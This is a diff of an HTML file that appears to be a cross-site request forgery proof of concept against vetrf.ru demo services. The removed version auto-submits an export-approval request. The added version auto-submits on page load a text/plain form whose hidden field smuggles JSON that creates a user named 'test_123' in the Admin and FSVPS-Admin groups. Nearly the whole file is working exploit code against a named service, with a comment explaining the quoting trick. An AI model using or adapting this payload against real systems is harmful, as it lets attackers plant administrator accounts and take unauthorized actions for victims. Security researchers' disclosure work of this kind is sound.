@@ -1,24 +1,25 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <form action="https://demo-argus.vetrf.ru/uvn/operatorui" method="POST" id="csrf-form">
-      <input type="hidden" name="cause" value="">
-      <input type="hidden" name="_action" value="viseExportDecision">
-      <input type="hidden" name="cancelAction" value="">
-      <input type="hidden" name="commonHSNumber" value="">
-      <input type="hidden" name="productTypePk" value="7">
-      <input type="hidden" name="type" value="Export">
-      <input type="hidden" name="documentPk" value="">
-      <input type="hidden" name="cargoPk" value="">
-      <input type="hidden" name="acPk" value="">
-      <input type="hidden" name="aucPk" value="">
-      <input type="hidden" name="requestPk" value="307775">
-      <input type="hidden" name="pk" value="307775">
-      <input type="hidden" name="version" value="1">
-      <input type="hidden" name="pageList" value="1">
-      <input type="hidden" name="cancelUrl" value="operatorui%3F_action%3DshowExportRequestForm%26requestPk%3D307712%26pageList%3D1">
-    </form>
-    <script>
-      document.getElementById('csrf-form').submit();
-    </script>
-  </body>
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF PoC — text/plain form</title>
+</head>
+<body onload="document.forms[0].submit()">
+
+<form action="https://demo-accounts.vetrf.ru/eac/newUser/saveUser"
+      method="POST"
+      enctype="text/plain">
+
+  <!--
+    name  + "=" + value  →  валидный JSON с "comment":"test="
+    Все двойные кавычки JSON свободно живут внутри одинарных кавычек HTML-атрибута.
+  -->
+  <input type="hidden"
+         name='{"comment":"test'
+         value='","directory":{"code":"LDAP_IT"},"groups":[{"name":"Admin","dn":"cn=Admin,ou=groups","description":"Группа для системных администраторов"},{"name":"FSVPS-Admin","dn":"cn=FSVPS-Admin,ou=groups","description":"Пользователи, имеющие доступ к админке сайта"}],"organization":{"guid":"4b6f52a7-9a47-4d3e-bd52-adf0ea25c1ad","name":"ФГБУ \"ВНИИЗЖ\""},"roles":[],"systems":[{"code":"ARGUS"}],"userList":[{"fio":"Необходимеобходимо Необходимо","login":"test_123","index":1,"updated":false,"primaryEmail":"fuz9ka2021@gmail.com","phone":""}]}'>
+
+  <input type="submit" value="Отправить">
+</form>
+
+</body>
 </html>
